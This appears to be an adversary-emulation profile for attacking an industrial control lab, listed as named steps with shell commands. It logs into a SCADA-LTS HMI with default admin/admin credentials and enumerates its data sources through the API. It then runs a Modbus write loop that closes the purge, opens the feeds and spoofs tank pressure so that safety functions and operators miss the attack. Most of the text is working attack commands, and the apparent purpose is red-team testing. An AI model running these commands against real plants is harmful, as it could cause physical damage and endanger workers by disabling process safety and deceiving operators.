ability.technique_name: Indicator Removal on Host: Clear Command History
ability.name: Avoid logs

steps.description: Scan the ICS process network for live Modbus hosts
steps.name: Nmap ICS Subnet Discovery

steps.command: curl -s -c /tmp/hmi_cookies.txt -d "username=admin&password=admin" "http://192.168.90.107:8080/login.htm" -o /tmp/hmi_login.html -w "%{http_code}" && echo "HTTP_STATUS:" && curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/data_point_details.shtm" -o /tmp/hmi_check.html && grep -qi "data\|point\|scada\|watch" /tmp/hmi_check.html && echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
steps.plaintext_command: curl -s -c /tmp/hmi_cookies.txt -d "username=admin&password=admin" "http://192.168.90.107:8080/login.htm" -o /tmp/hmi_login.html -w "%{http_code}" && echo "HTTP_STATUS:" && curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/data_point_details.shtm" -o /tmp/hmi_check.html && grep -qi "data\|point\|scada\|watch" /tmp/hmi_check.html && echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
steps.description: Login to SCADA-LTS HMI at root context path
steps.name: SCADA-LTS - Default Credential Login

steps.command: curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/ScadaBR/api/datasources" -H "Accept: application/json" | python3 -m json.tool 2>/dev/null || curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/ScadaBR/api/datapoints" -H "Accept: application/json" | python3 -m json.tool 2>/dev/null || echo "API enumeration attempted"
steps.plaintext_command: curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/ScadaBR/api/datasources" -H "Accept: application/json" | python3 -m json.tool 2>/dev/null || curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/ScadaBR/api/datapoints" -H "Accept: application/json" | python3 -m json.tool 2>/dev/null || echo "API enumeration attempted"
steps.description:
Use SCADA-LTS REST API to enumerate all configured data sources
and data points, revealing Modbus connections and register mappings
steps.name: SCADA-LTS - Enumerate Data Sources

steps.description: Read input registers from all 6 Modbus devices to map the process
steps.name: Modbus - Enumerate All Process I/O

steps.command: for i in $(seq 1 30); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null;  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 2>/dev/null;  ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 2>/dev/null;  ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000 2>/dev/null;  sleep 0.2;done && echo "COMBINED_ATTACK_COMPLETE"
steps.plaintext_command: for i in $(seq 1 30); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null;  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 2>/dev/null;  ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 2>/dev/null;  ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000 2>/dev/null;  sleep 0.2;done && echo "COMBINED_ATTACK_COMPLETE"
steps.description:
Close purge, open feeds, and spoof tank pressure simultaneously.
Uses simple for loop instead of shell functions.
steps.name: Modbus - Combined Attack and Deception

adversary.name: HMI Compromise and Operator Deception Adversary
adversary.description:
APT-style attack that compromises the HMI to gain process visibility,
then simultaneously manipulates valves AND spoofs sensor readings to
prevent both automated safety functions and operator awareness from
detecting the attack.

objectives.name: default
objectives.description: This is a default objective that runs forever.
